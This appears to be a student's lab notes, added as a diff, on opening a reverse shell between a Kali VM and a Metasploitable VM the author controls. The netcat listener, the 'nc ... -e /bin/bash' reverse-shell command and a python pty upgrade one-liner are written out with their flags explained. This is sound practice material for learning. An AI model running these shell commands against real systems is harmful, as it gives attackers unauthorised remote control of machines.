@@ -1,0 +1,17 @@
+This exercise will include ways to activate a shell. 
+
+1. Using netcat. This shell is opened with ease since I'm able to control both VMs involved from the start (Kali and Meta).
+
+2. After starting up and setting IPs on the Kali and Meta VMs, I typed the following commands to activate a reverse shell on the attacking machine (kali).
+
+3. Commands: 
+
+On Kali, "nc -lnvp 2222" << use netcat -l (start a listener), -n (use numeric IP addresses), -v (with a verbose output), -p (specifying port number 2222)
+
+On Meta, "nc 10.11.1.2 2222 -e /bin/bash" << use netcat to connect to the open listener on port 2222 on the Kali VM and then execute the bash terminal when doing so.
+
+On Kali, "dir" and "ls" << check to see if the reverse shell is active and sending back the list of the current working directory
+
+On Kali, "python -c 'import pty;pty.spawn("/bin/bash")'" << the current shell is lacking in capabilities so it may be best to activate a higher level shell. This script calls on python to execute a command (-c flag) and import the pty module so we can use .spawn("/bin/bash") to activate this higher level shell.
+
+Alright, that was a quick and easy exercise. I'll get the pics to go with starting with the label shell_practice_pic1.png.
